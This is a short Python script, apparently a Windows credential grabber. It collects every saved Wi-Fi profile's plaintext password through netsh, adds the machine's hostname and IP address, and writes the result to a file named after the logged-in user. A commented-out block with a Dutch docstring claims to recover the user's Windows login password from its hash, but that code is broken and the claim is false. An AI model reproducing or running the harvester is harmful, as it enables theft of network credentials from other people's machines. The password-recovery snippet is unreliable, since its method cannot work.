import subprocess
import sys
import socket
import os

sys.getdefaultencoding()
'utf-8'
login = os.getlogin()
f = open('INFO' + login, mode='at',encoding='utf-8')

login = os.getlogin()

f.write("___________________________________<" + login + ">___________________________________\n")
f.write("----------------------------------<WIFI>-----------------------------------\n")

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        var =  "{:<30}|  {:<}".format(i, results[0])
        f.write(var + "\n")
    except IndexError:
        var1 = ("{:<30}|  {:<}".format(i, ""))
        f.write(var1 + "\n")


f.write("----------------------------------<IP>-----------------------------------\n")

hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)

f.write("DEVICE_NAME: " + hostname + "\n")
f.write("IP_ADRESS: " + IPAddr + "\n")
f.write("-----------------------------------------------------------------------------\n")


f.write("_____________________________________________________________________________\n")
f.close()

print("done")

"""DIT SCRIPT ZOEKT DE HASHTAG IN WINDOWS EN VORMT DIE OM NAAR HET PASWOORD
ZO KAN JE HET PASWOORD VAN DE INGELOGDE GEBRUIKER VINDEN(ENKEL WINDOWS)
import win32crypt

# Get the user's password hash
password_hash = win32crypt.CryptUnprotectData(
    "password_to_hash".encode("utf-8"),
    None,
    None,
    None,
    0
)[1]

# Convert the password hash to a string
password_hash_str = password_hash.decode("utf-8")

# Get the user's password
password = win32crypt.CryptUnprotectData(
    password_hash_str.encode("utf-8"),
    None,
    None,
    None,
    0
)[1]

# Convert the password to a string
password_str = password.decode("utf-8")

# Print the password
print(password_str)"""






